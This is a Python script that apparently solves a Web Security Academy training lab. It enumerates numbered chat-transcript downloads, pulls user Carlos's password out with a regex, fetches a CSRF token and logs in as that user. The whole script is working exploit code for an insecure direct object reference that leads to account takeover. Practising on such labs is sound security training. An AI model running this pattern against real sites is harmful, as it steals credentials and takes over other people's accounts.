import requests
from bs4 import BeautifulSoup
import re

site = "0a6c00fb03c77dbb80ab80460092006f.web-security-academy.net"
s = requests.Session()

# Step 1: Find password in transcript
password = None
for i in range(1, 11):
    url = f"https://{site}/download-transcript/{i}.txt"
    resp = s.get(url)

    if "password" in resp.text.lower():
        print(f"[✓] Found potential password transcript at {url}")
        print(resp.text)
        match = re.search(r'password is ([a-zA-Z0-9]+)', resp.text)
        if match:
            password = match.group(1)
            print(f"[✓] Extracted Carlos's password: {password}")
            break

if not password:
    print("[!] Failed to extract password from transcripts.")
    exit(1)

# Step 2: CSRF-protected login flow as Carlos
login_page = s.get(f"https://{site}/login")
soup = BeautifulSoup(login_page.text, "html.parser")
csrf_token = soup.find("input", {"name": "csrf"})["value"]

login_data = {
    "csrf": csrf_token,
    "username": "carlos",
    "password": password
}
s.post(f"https://{site}/login", data=login_data)

# Step 3: Trigger lab solved check
s.get(f"https://{site}/my-account")
final_check = s.get(f"https://{site}/")

if "Congratulations" in final_check.text:
    print("[✓] Lab solved successfully after proper login as Carlos.")
else:
    print("[!] Proper login completed, but lab still not marked as solved.")
